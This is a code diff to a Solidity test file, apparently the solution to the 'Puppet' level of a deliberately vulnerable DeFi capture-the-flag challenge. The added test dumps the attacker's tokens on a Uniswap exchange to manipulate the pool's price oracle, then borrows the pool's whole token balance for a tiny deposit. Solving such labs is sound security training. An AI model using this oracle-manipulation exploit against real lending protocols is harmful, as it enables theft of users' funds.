@@ -96,16 +96,36 @@ contract Puppet is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
+    function testExploitPuppet() public {
         /**
          * EXPLOIT START *
          */
 
+         vm.startPrank(attacker);
+//  // 1. Approve Uniswap exchange to spend attacker's DVT tokens
+    dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+ 
+    // 2. Swap almost all of attacker's DVT for ETH, drastically changing the price
+    uniswapExchange.tokenToEthSwapInput(
+        ATTACKER_INITIAL_TOKEN_BALANCE - 1, // Keep 1 wei to avoid potential issues
+        1, // Accept any amount of ETH
+        DEADLINE
+    );
+
+    // 3. Calculate the deposit required to borrow all tokens from the pool
+    uint256 depositRequired = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+
+  console.log(depositRequired);
+    // // 4. Borrow all tokens from the pool
+ puppetPool.borrow{value: depositRequired}(POOL_INITIAL_TOKEN_BALANCE);
+
+    vm.stopPrank();
         /**
          * EXPLOIT END *
          */
-        validation();
-        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+     validation();
+     console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
 
     function validation() internal {
